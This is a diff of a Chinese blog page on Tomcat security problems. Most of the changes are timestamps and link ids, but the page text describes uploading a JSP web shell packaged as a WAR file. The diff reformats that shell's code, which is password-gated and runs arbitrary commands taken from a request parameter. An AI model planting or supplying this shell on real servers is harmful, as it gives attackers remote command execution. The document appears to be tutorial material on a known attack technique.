@@ -47,7 +47,7 @@
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/44153330.jpg">
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/39672229.jpg">
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/41597270.jpg">
-<meta property="og:updated_time" content="2020-08-26T06:28:19.951Z">
+<meta property="og:updated_time" content="2020-08-26T06:30:25.610Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Tomcat 安全问题">
 <meta name="twitter:description" content="Tomcat 安全问题">
@@ -168,7 +168,7 @@
 <p><strong>上传War包</strong></p>
 <p>先将jsp马压缩为zip，再将zip后缀改名为war，然后上传war包。</p>
 <p>本次上传的为xima.jsp。</p>
-<p>&lt;%<br>if(“023”.equals(request.getParameter(“pwd”))){<br> java.io.InputStream in =<br> Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();<br> int a = -1;<br> byte[] b = new byte[2048];<br> out.print(“<pre>“);<br> while((a=in.read(b)) !=1){<br> out.println(new String(b));<br> }<br> out.print(“</pre>“);<br>}<br>%&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;  </span><br><span class="line"> java.io.InputStream in =   </span><br><span class="line"> Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();  </span><br><span class="line"> int a = -1;  </span><br><span class="line"> byte[] b = new byte[2048];  </span><br><span class="line"> out.print(&quot;&lt;pre&gt;&quot;);  </span><br><span class="line"> while((a=in.read(b)) !=1)&#123;  </span><br><span class="line"> out.println(new String(b));  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.print(&quot;&lt;/pre&gt;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/8954479.jpg" alt=""></p>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/17014498.jpg" alt=""></p>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/74839062.jpg" alt=""></p>
@@ -225,7 +225,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/21/Tomcat2/" data-id="ckeazz32m004zl4xdaqvqv7et" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/09/21/Tomcat2/" data-id="ckeb01kxy0041nsxdp7vlnxq3" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tomcat/">Tomcat</a></li></ul>
